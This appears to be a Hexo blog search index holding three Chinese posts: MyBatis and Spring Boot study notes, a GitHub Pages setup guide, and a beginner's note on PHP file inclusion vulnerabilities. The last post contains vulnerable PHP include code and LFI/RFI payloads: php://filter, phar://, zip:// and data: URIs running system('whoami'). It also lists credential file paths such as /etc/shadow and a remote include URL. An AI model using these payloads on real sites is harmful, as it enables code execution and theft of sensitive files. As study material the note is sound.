@Select(&quot;select * from user where name like concat(&#x27;%&#x27;,#&#123;name&#125;,&#x27;%&#x27;) and gender=#&#123;gender&#125; and &quot; +        &quot;entrydate between #&#123;begin&#125; and #&#123;end&#125; order by update_time desc&quot;)List&lt;User&gt; list(String name, Short gender, LocalDate begin,LocalDate end);



改用xml映射的方式：
如果xml中sql语句没有高亮，上下文操作中选择注入语言
&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;&lt;!DOCTYPE mapper        PUBLIC &quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;        &quot;https://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;&gt;&lt;!--mapper根标签--&gt;&lt;mapper namespace=&quot;com.wwwtty.xml_reflect.mapper.EmpMapper&quot;&gt;        &lt;!--    id:Mapper类中的方法名    --&gt;        &lt;!--   resultType:返回值所封装的单条记录的类型的全类名,比如返回值是List&lt;User&gt;,填的就是User的全类名     --&gt;        &lt;select id=&quot;list&quot; resultType=&quot;com.wwwtty.xml_reflect.pojo.User&quot;&gt;                select * from user where name like concat(&#x27;%&#x27;,#&#123;name&#125;,&#x27;%&#x27;) and gender=#&#123;gender&#125; and                entrydate between #&#123;begin&#125; and #&#123;end&#125; order by update_time desc        &lt;/select&gt;&lt;/mapper&gt;

xml映射适合于复杂sql
动态sql
&lt; if &gt;
&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;&lt;!DOCTYPE mapper        PUBLIC &quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;        &quot;https://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;&gt;&lt;!--mapper根标签--&gt;&lt;mapper namespace=&quot;com.wwwtty.xml_reflect.mapper.EmpMapper&quot;&gt;        &lt;!--    id:Mapper类中的方法名    --&gt;        &lt;!--   resultType:返回值所封装的单条记录的类型的全类名,比如返回值是List&lt;User&gt;,填的就是User的全类名     --&gt;        &lt;select id=&quot;list&quot; resultType=&quot;com.wwwtty.xml_reflect.pojo.User&quot;&gt;                select *                from user                where                &lt;if test=&quot;name != null&quot;&gt;                        name like concat(&#x27;%&#x27;, #&#123;name&#125;, &#x27;%&#x27;)                &lt;/if&gt;                &lt;if test=&quot;gender != null&quot;&gt;                        and gender = #&#123;gender&#125;                &lt;/if&gt;                &lt;if test=&quot;begin != null and end != null&quot;&gt;                        and entrydate between #&#123;begin&#125; and #&#123;end&#125;                &lt;/if&gt;                order by update_time desc        &lt;/select&gt;&lt;/mapper&gt;

empMapper.list(name,null,null,end);

相应的sql语句：

&lt; where &gt;在上面的例子中，如果我们只筛选性别：

但是这个and还很不好删除（容易别的地方出错）
作用：根据if的结果（子元素），自动添加&#x2F;删除where；同时自动删除多余的and和or
使用&lt; where &gt;解决
&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;&lt;!DOCTYPE mapper        PUBLIC &quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;        &quot;https://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;&gt;&lt;!--mapper根标签--&gt;&lt;mapper namespace=&quot;com.wwwtty.xml_reflect.mapper.EmpMapper&quot;&gt;        &lt;!--    id:Mapper类中的方法名    --&gt;        &lt;!--   resultType:返回值所封装的单条记录的类型的全类名,比如返回值是List&lt;User&gt;,填的就是User的全类名     --&gt;        &lt;select id=&quot;list&quot; resultType=&quot;com.wwwtty.xml_reflect.pojo.User&quot;&gt;                        select *                        from user                            &lt;where&gt;                                    &lt;if test=&quot;name != null&quot;&gt;                                            name like concat(&#x27;%&#x27;, #&#123;name&#125;, &#x27;%&#x27;)                                    &lt;/if&gt;                                    &lt;if test=&quot;gender != null&quot;&gt;                                            and gender = #&#123;gender&#125;                                    &lt;/if&gt;                                    &lt;if test=&quot;begin != null and end != null&quot;&gt;                                            and entrydate between #&#123;begin&#125; and #&#123;end&#125;                                    &lt;/if&gt;                                    order by update_time desc                            &lt;/where&gt;        &lt;/select&gt;&lt;/mapper&gt;

运行生成的sql：

&lt; set &gt;去除set中多余的逗号
案例:动态更新如果我们这样写动态更新的xml配置文件
&lt;update id=&quot;update&quot;&gt;    update user    set    &lt;if test=&quot;username != null&quot;&gt;        username=#&#123;username&#125;,    &lt;/if&gt;    &lt;if test=&quot;password != null&quot;&gt;        password=#&#123;password&#125;,    &lt;/if&gt;    &lt;if test=&quot;name != null&quot;&gt;        name=#&#123;name&#125;,    &lt;/if&gt;    &lt;if test=&quot;gender != null&quot;&gt;        gender=#&#123;gender&#125;,    &lt;/if&gt;    &lt;if test=&quot;image != null&quot;&gt;        image=#&#123;image&#125;,    &lt;/if&gt;    &lt;if test=&quot;job != null&quot;&gt;        job=#&#123;job&#125;,    &lt;/if&gt;    &lt;if test=&quot;entrydate != null&quot;&gt;        entrydate=#&#123;entrydate&#125;,    &lt;/if&gt;    &lt;if test=&quot;deptId != null&quot;&gt;        dept_id=#&#123;deptId&#125;,    &lt;/if&gt;    &lt;if test=&quot;createDate != null&quot;&gt;        create_time=#&#123;createTime&#125;,    &lt;/if&gt;    &lt;if test=&quot;updateTime != null&quot;&gt;        update_time=#&#123;updateTime&#125;    &lt;/if&gt;    where id = #&#123;id&#125;&lt;/update&gt;


会有多一个逗号的情况
使用 &lt; set &gt;解决
 
&lt; foreach &gt;场景：批量删除
delete from user where id in(3,4,5);

void deleteByIds(List&lt;Integer&gt; list);

&lt;delete id=&quot;deleteByIds&quot;&gt;    &lt;foreach collection=&quot;&quot; item=&quot;&quot; separator=&quot;&quot; open=&quot;&quot; close=&quot;&quot;&gt;    &lt;/foreach&gt;&lt;/delete&gt;


collection:要遍历的集合

item:遍历出的元素

separator:分隔符

open:遍历开始前拼接的sql片段

close:遍历结束后拼接的sql片段
  &lt;!--    delete from user where id in(3,4,5)    --&gt;&lt;delete id=&quot;deleteByIds&quot;&gt;    delete from user where id in    &lt;foreach collection=&quot;list&quot; item=&quot;id&quot; separator=&quot;,&quot; open=&quot;(&quot; close=&quot;)&quot;&gt;        #&#123;id&#125;    &lt;/foreach&gt;&lt;/delete&gt;

&lt; sql &gt;&lt; sql &gt;用于封装一些重复使用的sql片段，并分配一个唯一的id
&lt; include &gt;用&lt; include &gt;包含&lt; sql &gt;封装的sql片段，用refid&#x3D;id从而完成包含
void selectArgs();void selectById();



&lt;sql id=&quot;basicSelect&quot;&gt;    select username,    password,    name,    gender,    id,    username,    password,    name,    gender,    image,    job,    entrydate,    dept_id,    create_time,    update_time    from user&lt;/sql&gt;&lt;select id=&quot;selectArgs&quot;&gt;    &lt;include refid=&quot;basicSelect&quot; /&gt;&lt;/select&gt;&lt;select id=&quot;selectById&quot;&gt;    &lt;include refid=&quot;basicSelect&quot; /&gt;&lt;/select&gt;


案例
开发规范
Restful

统一响应结果
开发流程
部门管理部门管理-查询接口文档：

//使用该注解就不用自己new日志对象@Slf4j@RestControllerpublic class deptController &#123;        @RequestMapping(&quot;/dept&quot;)        public Result list()&#123;                log.info(&quot;查询所有部门信息&quot;);                return Result.Success();        &#125;&#125;

ps：构建项目时不要选lombok，否则要在pom.xml中注释以下内容：

否则报错：

postman测试：
日志输出：
指定请求方法@RequestMapping(value = &quot;/depts&quot;,method = RequestMethod.GET)//简化版本 @GetMapping(&quot;depts&quot;)

注入依赖Controller层
@Slf4j@RestControllerpublic class deptController &#123;        @Autowired        private deptService service;        @GetMapping(&quot;depts&quot;)        public Result list() &#123;                log.info(&quot;查询所有部门信息&quot;);                //查询所有部门信息                List&lt;Dept&gt; deptList = service.list();                return Result.success(deptList);        &#125;&#125;

Service层
@Servicepublic class deptImpl implements deptService &#123;        @Autowired        private deptMapper mapper;        @Override        public List&lt;Dept&gt; list() &#123;                return mapper.list();        &#125;&#125;

Mapper层
@Mapperpublic interface deptMapper &#123;        @Select(&quot;select * from dept&quot;)        public List&lt;Dept&gt; list();&#125;


部门管理-删除接口文档
流程
Controller层@DeleteMapping(&quot;/depts/&#123;id&#125;&quot;)public Result delete(@PathVariable Integer id)&#123;    log.info(&quot;根据id删除部门:&#123;&#125;&quot;,id);    service.delete(id);    return Result.success();&#125;



Service层@Overridepublic void delete(Integer id) &#123;    mapper.deleteById(id);&#125;



Mapper层@Delete(&quot;delete from dept where id=#&#123;id&#125;&quot;)void deleteById(Integer id);

postman测试
执行结果

部门管理-新增接口文档

Controller层@PostMapping(&quot;/depts&quot;)public Result add(@RequestBody Dept dept)&#123;    log.info(&quot;新增部门&#123;&#125;&quot;,dept);    service.add(dept);    return Result.success();&#125;



Service层@Overridepublic void add(Dept dept)&#123;    dept.setCreateTime(LocalDate.now());    dept.setUpdateTime(LocalDate.now());    mapper.insert(dept);&#125;



Mapper层@Insert(&quot;insert into dept (name,create_time,update_time) values (#&#123;name&#125;,#&#123;createTime&#125;,#&#123;updateTime&#125;)&quot;)void insert(Dept dept);



postman测试
结果

简化RequestMapping

员工管理分页查询分析
接口文档




封装实体类
@Data@NoArgsConstructor@AllArgsConstructorpublic class pageBean &#123;        private Long total;        private List rows;&#125;

实现Mapper层@Mapperpublic interface EmpMapper &#123;        /**         * 查询总记录数         * @return         */        @Select(&quot;select count(*) from emp&quot;)         Long count();        /**         *         * @param page:起始页         * @param pageSize:查多少页         * @return         */        @Select(&quot;select * from emp limit #&#123;page&#125;,#&#123;pageSize&#125;&quot;)         List&lt;Emp&gt; page(Integer page,Integer pageSize);&#125;

Service层@Servicepublic class empImpl implements empService &#123;        @Autowired        EmpMapper empMapper;        @Override        public PageBean page(Integer page, Integer pageSize) &#123;                Long total = empMapper.count();                Integer start = (page - 1) * pageSize;                List&lt;Emp&gt; rows = empMapper.page(start, pageSize);                //封装pageBean                PageBean pageBean = new PageBean(total,rows);                return pageBean;        &#125;&#125;



Controller层
用@RequestParam(defaultValue&#x3D;””)设置参数默认值
@RestControllerpublic class empController &#123;        @GetMapping(&quot;/emps&quot;)        public Result page(@RequestParam(defaultValue = &quot;1&quot;) Integer page, @RequestParam(defaultValue = &quot;10&quot;) Integer pageSize)&#123;                return new Result();        &#125;&#125;

日志输出
log.info(&quot;分页查询,分页查询页码为&#123;&#125;,每页记录数为&#123;&#125;&quot;,page,pageSize);

调用Service层
PageBean pageBean = empservice.page(page,pageSize);

@Slf4j@RestControllerpublic class empController &#123;        @Autowired        empService empservice;        @GetMapping(&quot;/emps&quot;)        public Result page(@RequestParam(defaultValue = &quot;1&quot;) Integer page, @RequestParam(defaultValue = &quot;10&quot;) Integer pageSize)&#123;                log.info(&quot;分页查询,起始&#123;&#125;,查询&#123;&#125;页&quot;,page,pageSize);//                调用service层                PageBean pageBean = empservice.page(page,pageSize);                return Result.success(pageBean);        &#125;&#125;

测试postman

前后端联调

PageHelper插件
引入依赖
这里的版本不能按照课件的1.4.2，否则会强转异常(ClassCastException)
&lt;dependency&gt;    &lt;groupId&gt;com.github.pagehelper&lt;/groupId&gt;    &lt;artifactId&gt;pagehelper-spring-boot-starter&lt;/artifactId&gt;    &lt;version&gt;1.4.6&lt;/version&gt;&lt;/dependency&gt;

EmpMapper
@Select(&quot;select* from emp&quot;)List&lt;Emp&gt; list();

EmpServer的实现类
@Overridepublic PageBean page(Integer page, Integer pageSize) &#123;    //设置分页参数    PageHelper.startPage(page,pageSize);    //执行查询    List&lt;Emp&gt; empList = empMapper.list();    Page&lt;Emp&gt; page1 = (Page&lt;Emp&gt;)empList;    //封装bean对象    PageBean pageBean = new PageBean(page1.getTotal(),page1.getResult());    return pageBean;&#125;

条件分页查询接口文档
Controller//方法声明public Result page(    @RequestParam(required = false) String name,    @RequestParam(required = false) Short gender,    @RequestParam(required = false) @DateTimeFormat(pattern = &quot;yyyy-MM-dd&quot;) LocalDate begin,     @RequestParam(required = false) @DateTimeFormat(pattern = &quot;yyyy-MM-dd&quot;) LocalDate end, 					                         @RequestParam(defaultValue = &quot;1&quot;) Integer page,     @RequestParam(defaultValue = &quot;10&quot;) Integer pageSize)

Service层@Overridepublic PageBean page(String name, Short gender, LocalDate begin, LocalDate end, Integer page, Integer pageSize) &#123;    PageHelper.startPage(page,pageSize);    List&lt;Emp&gt;  empList = empMapper.page(name, gender, begin, end);    Page&lt;Emp&gt; empPage = (Page&lt;Emp&gt;) empList;    PageBean pageBean = new PageBean(empPage.getTotal(), empPage.getResult());    return pageBean;&#125;

Mapper层/*** @param name* @param gender* @param begin 起始create_time* @param end   中止create_time* @return*/List&lt;Emp&gt; page(String name, Short gender, LocalDate begin, LocalDate end);

使用了PageHelper之后，Mapper中就不要再使用page与pageSize参数，否则会导致生成的sql变为
SELECT count(0) FROM emp LIMIT ?, ?

就查不到了
XML映射文件&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;&lt;!DOCTYPE mapper        PUBLIC &quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;        &quot;https://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;&gt;&lt;!--mapper根标签--&gt;&lt;mapper namespace=&quot;com.wwwtty.springmybatisdemo.Mapper.EmpMapper&quot;&gt;        &lt;!--    id:Mapper类中的方法名    --&gt;        &lt;!--   resultType:返回值所封装的单条记录的类型的全类名,比如返回值是List&lt;User&gt;,填的就是User的全类名     --&gt;        &lt;select id=&quot;page&quot; resultType=&quot;com.wwwtty.springmybatisdemo.pojo.Emp&quot;&gt;            select * from emp                &lt;where&gt;                    	&lt;!-- 这里还需要判断空字符串，否则会多拼上name like %% --&gt;                        &lt;if test=&quot;name != null and name != &#x27;&#x27;&quot;&gt;                            name like concat(&#x27;%&#x27;,#&#123;name&#125;,&#x27;%&#x27;)                        &lt;/if&gt;                        &lt;if test=&quot;gender != null&quot;&gt;                            and gender = #&#123;gender&#125;                        &lt;/if&gt;                        &lt;if test=&quot;begin != null and end != null&quot;&gt;                            and entrydate between #&#123;begin&#125; and #&#123;end&#125;                        &lt;/if&gt;                &lt;/where&gt;        &lt;/select&gt;&lt;/mapper&gt;

删除员工接口文档


Controller层请求方法为Delete,@DeleteMapping(&#123;ids&#125;)注解;路径参数ids前加上@PathVariable

@DeleteMapping(&quot;/&#123;ids&#125;&quot;)public Result delete(@PathVariable List&lt;Integer&gt; ids)&#123;    log.info(&quot;批量删除ids:&#123;&#125;&quot;,ids);    empservice.delete(ids);    return Result.success();&#125;

Service层@Overridepublic void delete(List&lt;Integer&gt; ids) &#123;    empMapper.delete(ids);&#125;

Mapper层对应sql:
delete from emp where id in (1,2,3)

xml映射文件中:&lt; foreach &gt;实现对数组的遍历
&lt;delete id=&quot;delete&quot;&gt;    delete from emp where id in    &lt;foreach collection=&quot;ids&quot; item=&quot;id&quot; separator=&quot;,&quot; open=&quot;(&quot; close=&quot;)&quot;&gt;        #&#123;id&#125;    &lt;/foreach&gt;&lt;/delete&gt;

新增员工接口文档


Controller层//前端发送json请求体，封装为pojo实体类@PostMappingpublic Result save(@RequestBody Emp emp)&#123;    empservice.save(emp);    return Result.success();&#125;

Service层@Overridepublic void save(Emp emp) &#123;    emp.setCreateTime(LocalDateTime.now());    emp.setUpdateTime(LocalDateTime.now());    empMapper.insert(emp);&#125;

Mapper层void insert(Emp emp);

xml映射文件
&lt;insert id=&quot;insert&quot;&gt;        insert into emp (username, name, gender, image, job, entrydate, dept_id,create_time,update_time) values     	(#&#123;username&#125;,#&#123;name&#125;,#&#123;gender&#125;,#&#123;image&#125;,#&#123;deptId&#125;,#&#123;entryDate&#125;,#&#123;job&#125;,#&#123;createTime&#125;,#&#123;updateTime&#125;)&lt;/insert&gt;

文件上传前端表单：&lt;form action=&quot;&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;    &lt;input type=&quot;text&quot; name=&quot;name&quot;&gt;    &lt;input type=&quot;password&quot; name=&quot;passwd&quot;&gt;    &lt;input type=&quot;file&quot; name=&quot;file&quot;&gt;    &lt;button type=&quot;submit&quot;&gt;submit&lt;/button&gt;&lt;/form&gt;


若不指定enctype&#x3D;”multipart&#x2F;form-data”,上传时只会上传文件名


改成enctype&#x3D;”multipart&#x2F;form-data”

请求中有了文件内容


后端:使用MultipartFile这个api来接收
@Slf4j@RestControllerpublic class UploadController &#123;        @PostMapping(&quot;/upload&quot;)        public Result upload(String name,String passwd,@RequestParam(&quot;file&quot;) MultipartFile image)&#123;                log.info(&quot;用户名:&#123;&#125;,密码:&#123;&#125;,收到文件:&#123;&#125;&quot;,name,passwd,image);                return Result.success();        &#125;&#125;

进行测试:

本地存储服务端，接收到上传的文件后，存储在本地服务器磁盘
demo:在static目录下新建了一个upload目录

@Slf4j@RestControllerpublic class UploadController &#123;        @PostMapping(&quot;/upload&quot;)        public Result upload(String name,String passwd,@RequestParam(&quot;file&quot;) MultipartFile image) throws Exception &#123;                log.info(&quot;用户名:&#123;&#125;,密码:&#123;&#125;,收到文件:&#123;&#125;&quot;,name,passwd,image);                //获取原始文件名                String fileName =  image.getOriginalFilename();                //本地存储                image.transferTo(new File(&quot;static/upload&quot;+fileName));                                return Result.success();        &#125;&#125;

postman测试


存在问题:如果两个用户上传了相同名字的文件，那么就覆盖了
所以我们需要构造唯一的文件名
使用uuid@Testvoid contextLoads() &#123;    String uuid = UUID.randomUUID().toString();    System.out.println(uuid);&#125;

简单的解决:(这么做有漏洞)@PostMapping(&quot;/upload&quot;)public Result upload(String name,String passwd,@RequestParam(&quot;file&quot;) MultipartFile image) throws Exception &#123;    log.info(&quot;用户名:&#123;&#125;,密码:&#123;&#125;,收到文件:&#123;&#125;&quot;,name,passwd,image);    //获取原始文件名    String originalFilename =  image.getOriginalFilename();    //最后一个.的位置    int index = originalFilename.lastIndexOf(&#x27;.&#x27;);    //获取拓展名    String extName = originalFilename.substring(index);    //拼接文件名    String fileName = UUID.randomUUID().toString()+extName;    //本地存储    image.transferTo(new File(&quot;D:\\JavaWeb\\Spring-Mybatis-demo\\src\\main\\resources\\static\\upload\\&quot;+fileName));    return Result.success();&#125;

如果上传一个大文件

这是因为

application.properties中
#单个文件限制大小spring.servlet.multipart.max-file-size=10MB#单个请求上传大小spring.servlet.multipart.max-request-size=100MB


云存储
官方文档
文件上传SDK
复制官方代码
获取endpoint
设置上传到OSS中的文件名以及要上传的文件路径// 在OSS中叫什么名字String objectName = &quot;test.md&quot;;// 填写本地文件的完整路径，例如D:\\localpath\\examplefile.txt。// 如果未指定本地路径，则默认从示例程序所属项目对应本地路径中上传文件流。String filePath= &quot;D:\\My_Blogs\\myblogs\\source\\_posts\\Vue.md&quot;;// 填写Bucket所在地域。以华东1（杭州）为例，Region填写为cn-hangzhou。


bucket文件列表中查看

]]></content>
      <categories>
        <category>JavaWeb</category>
      </categories>
      <tags>
        <tag>JavaWeb</tag>
      </tags>
  </entry>
  <entry>
    <title>搭建自己的GitHub-page</title>
    <url>/2025/05/21/%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84github-Page/</url>
    <content><![CDATA[搭建自己的github-Page生成SSH Keyssh-keygen -t rsa -C &quot;github绑定邮箱&quot;


验证ssh -T git@github.com


新建自己的仓库








下载git下载链接:https://git-scm.com/downloads/win
参考链接:https://blog.csdn.net/qq_39809160/article/details/145712755

搭建本地博客创建博客目录
安装hexonpm install -g hexo/cli


#创建一个新的hexo项目hexo init myblogs


此时的目录结构


cd myblogsnpm install

此时项目结构

运行hexo项目
hexo server


部署到github获取个人token






打开_config.yml

编辑_config.yml
当前博客目录安装git插件npm install hexo-deployer-git --save

最后hexo clean      # 清理 Hexo 缓存：hexo generate   # 重新生成静态文件#hexo deploy这步之前要先验证身份#git config --global user.email &quot;272510545@qq.com&quot;#git config --global user.name &quot;blkheadfish&quot;hexo deploy     # hexo deploy


博客路径
博客配置项在_config.yml中
修改浏览器tab页标题

#部署到githubhexo g -d


]]></content>
      <tags>
        <tag>杂项</tag>
      </tags>
  </entry>
  <entry>
    <title>任意文件包含漏洞学习笔记</title>
    <url>/2024/09/12/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
    <content><![CDATA[前言本文是初学web安全时写的，有许多地方不够严谨，逻辑上也存在问题，请见谅~
参考：https://blog.csdn.net/qq_41575340/article/details/91897245
什么是文件包含1.文件包含漏洞概述和SQL注入等攻击方式一样，文件包含漏洞也是一种注入型漏洞，其本质就是输入一段用户能够控制的脚本或者代码，并让服务端执行。
什么叫包含呢？以PHP为例，我们常常把可重复使用的函数写入到单个文件中，在使用该函数时，直接调用此文件，而无需再次编写函数，这一过程叫做包含。
有时候由于网站功能需求，要包含的文件是一个变量，那么前端用户就可以进行选择要包含的文件，而开发人员又没有对要包含的文件进行安全考虑，就导致攻击者可以通过修改文件的位置来让后台执行任意文件，从而导致文件包含漏洞。
以PHP为例,常用的文件包含函数有以下四种include(),require(),include_once(),require_once()区别如下:
require():找不到被包含的文件会产生致命错误，并停止脚本运行include():找不到被包含的文件只会产生警告，脚本继续执行require_once()与require()类似:唯一的区别是如果该文件的代码已经被包含，则不会再次包含include_once()与include()类似:唯一的区别是如果该文件的代码已经被包含，则不会再次包含
例子：在小皮的根目录下放一个test.php里面写上
&lt;?php include $_GET[&#x27;test&#x27;];?&gt;

在根目录下放另外一个file.php
&lt;?php phpinfo();?&gt;

构造url,把file.php作为参数传入
http://192.168.127.231/test.php?test=file.php

文件包含成功

大多数情况下，文件包含函数中包含的代码文件是固定的，因此也不会出现安全问题。 但是，有些时候，文件包含的代码文件被写成了一个变量，且这个变量可以由前端用户传进来，这种情况下，如果没有做足够的安全考虑，则可能会引发文件包含漏洞。 攻击着会指定一个“意想不到”的文件让包含函数去执行，从而造成恶意操作。 根据不同的配置环境，文件包含漏洞分为如下两种情况：
分类1.本地文件包含漏洞（LFI）仅能够对服务器本地的文件进行包含，由于服务器上的文件并不是攻击者所能够控制的，因此该情况下，攻击者更多的会包含一些 固定的系统配置文件，从而读取系统敏感信息。很多时候本地文件包含漏洞会结合一些特殊的文件上传漏洞，从而形成更大的威力。
eg:pikachu靶场的fileinclusion


文件通过一个叫$filename的变量进行包含


但是路径限制在了include下，那么在include文件夹下创建一个test.txt文件、
&lt;?php phpinfo();?&gt;

构造urlhttp://192.168.127.231/pikachu/vul/fileinclude/fi_local.php?filename=test.txt&amp;submit=提交查询
这样test.txt就被包含执行了
包含姿势php伪协议PHP伪协议是PHP自己支持的一种协议与封装协议，简单来说就是PHP定义的一种特殊访问资源的方法。
有些伪协议成功执行需要allow_url_fopen和allow_url_include的支持。
allow_url_fopen On&#x2F;Off 允许或禁止打开URL文件allow_url_include On&#x2F;Off 允许或禁止引用URL文件php:&#x2F;&#x2F;input
php:&#x2F;&#x2F;inputphp:&#x2F;&#x2F;input可以访问请求的原始数据的只读流，将post请求的数据当作php代码执行。当传入的参数作为文件名打开时，可以将参数设为php:&#x2F;&#x2F;input,同时post想设置的文件内容，php执行时会将post内容当作文件内容。从而导致任意代码执行
当enctype&#x3D;”multipart&#x2F;form-data” 的时候 php:&#x2F;&#x2F;input 是无效的。
利用条件：

allow_url_include &#x3D; On。
对allow_url_fopen不做要求。

php:&#x2F;&#x2F;filterphp:&#x2F;&#x2F;filter 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、 file() 和 file_get_contents()， 在数据流内容读取之前没有机会应用其他过滤器。
在利用上很多都是与包含函数结合使用，读入或者输出获取文件源码然后编码让其不执行从而输出
php:&#x2F;&#x2F;filter 的使用：如php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index.phpphp:&#x2F;&#x2F;filter&#x2F;resource&#x3D;index.php
其他姿势：
file.php?file=php://filter/convert.base64-encode/resource=index.php

效果跟前面一样，少了read等关键字。在绕过一些waf时也许有用。
php:&#x2F;&#x2F;filter 伪协议组成：read&#x3D;&lt;读链的筛选列表&gt;resource&#x3D;&lt;要过滤的数据流&gt;write&#x3D;&lt;写链的筛选列表&gt;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;处理方式（base64编码，rot13等等）&#x2F;resource&#x3D;要读取的文件
read 对应要设置的过滤器：常见的过滤器分字符串过滤器、转换过滤器、压缩过滤器、加密过滤器其中convert.base64-encode ，convert.base64-decode都属于 转换过滤器
phar:&#x2F;&#x2F;
利用条件：
php版本大于等于php5.3.0

假设有个文件phpinfo.php，其内容为，打包成zip压缩包phpinfo.zip
利用：
指定绝对路径：
file.php?file=phar://D:/phpStudy/WWW/phpinfo.zip/phpinfo.php

也可以使用相对路径：
file.php?file=phar://phpinfo.zip/phpinfo.php

zip:&#x2F;&#x2F;与bzip2:&#x2F;&#x2F;与zlib:&#x2F;&#x2F;协议zip:&#x2F;&#x2F; 等属于压缩流的协议，通过直接压缩普通文件为zip文件，再通过zip:&#x2F;&#x2F; 协议读取，可以直接执行php代码。压缩后的zip文件可以随意修改后缀也不影响zip:&#x2F;&#x2F;协议读取。（注意是如phpinfo.txt直接压缩为zip,而不是文件夹压缩zip）
利用条件：

php版本大于等于php5.3.0

姿势：
构造zip包的方法和phar相同。
 但是使用zip伪协议，需要指定绝对路径，同时将#编码为%23,之后填上压缩包内的文件·。
格式示例：
&lt;?php$a=($_GET[&quot;file&quot;]);include($a);?&gt;

压缩及协议访问格式：
压缩文件为.zip后缀zip:&#x2F;&#x2F;绝对路径&#x2F;phpinfo.zip%23phpinfo.php压缩文件为.bz2后缀compress.bzip2:&#x2F;&#x2F;绝对路径&#x2F;phpinfo.zip&#x2F;phpinfo.php压缩文件为.gz后缀compress.zlib:&#x2F;&#x2F;绝对路径&#x2F;phpinfo.zip&#x2F;phpinfo.php
data：URI schema利用条件：

php版本大于等于php5.2
allow_url_fopen &#x3D; On
allow_url_include &#x3D; On

姿势一：
?file=data:text/plain,&lt;?php phpinfo();?&gt;

也可以执行命令：
?file=data:text/plain,&lt;?php system(&#x27;whoami&#x27;);?&gt;

姿势二：
?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b

PD9waHAgc3lzdGVtKCd3aG9hbWknKTs&#x2F;Pg&#x3D;&#x3D;的base64解码为：
&lt;?php system(&#x27;whoami&#x27;);?&gt;

包含session利用条件：
1.session文件路径已知，且其中内容部分可控。

姿势：
php的session文件的保存路径可以在phpinfo的session.save_path看到。
常见的php-session存放位置：
/var/lib/php/sess_PHPSESSID/var/lib/php/sess_PHPSESSID/tmp/sess_PHPSESSID/tmp/sessions/sess_PHPSESSID

其中，session文件的格式是固定的：sess_phpsessid.而phpsessid在发送的请求的cookie字段中可以看到。
敏感文件位置Linux：
/etc/passwd                                                                      //  账户信息/etc/shadow                                                                      //  账户密码文件/usr/local/app/apache2/conf/httpd.conf                                           //   Apache2默认配置文件/usr/local/app/apache2/conf/extra/httpd-vhost.conf                                //   虚拟网站配置/usr/local/app/php5/lib/php.ini                                                  //   PHP相关配置/etc/httpd/conf/httpd.conf                                                       //   Apache配置文件/etc/my.conf                                                                     //   mysql 配置文件

Win：
c:\boot.ini                                                                      // 查看系统版本c:\windows\system32\inetsrv\MetaBase.xml                                         //  IIS配置文件c:\windows\repair\sam                                                            //  存储Windows系统初次安装的密码c:\Program Files\mysql\my.ini                                                    //   MySQL配置c:\Program Files\mysql\data\mysql\user.MYD                                       //   MySQL rootc:\windows\php.ini                                                               //   php 配置信息c:\windows\my.ini                                                                //   MySQL 配置文件



2.远程文件包含漏洞（RFI） 如果PHP的配置选项allow_url_include、allow_url_fopen状态为ON的话，则include&#x2F;require函数是可以加载远程文件的，这种漏洞被称为远程文件包含(RFI)
能够通过url地址对远程的文件进行包含，这意味着攻击者可以传入任意的代码，这种情况没啥好说的，准备挂彩。因此，在web应用系统的功能设计上尽量不要让前端用户直接传变量给包含函数，如果非要这么做，也一定要做严格的白名单策略进行过滤。 
eg测试代码：


&lt;?php	$file = @$_GET[&#x27;file&#x27;];	@include($file);?&gt;

在远程服务器上的文件代码(test.txt)


&lt;?phpphpinfo();?&gt;

payload:
http://127.0.0.1/file.php?file=http://192.168.1.103/test.txt
]]></content>
      <categories>
        <category>Web安全</category>
        <category>任意文件包含漏洞</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>PHP</tag>
        <tag>任意文件包含漏洞</tag>
      </tags>
  </entry>
</search>
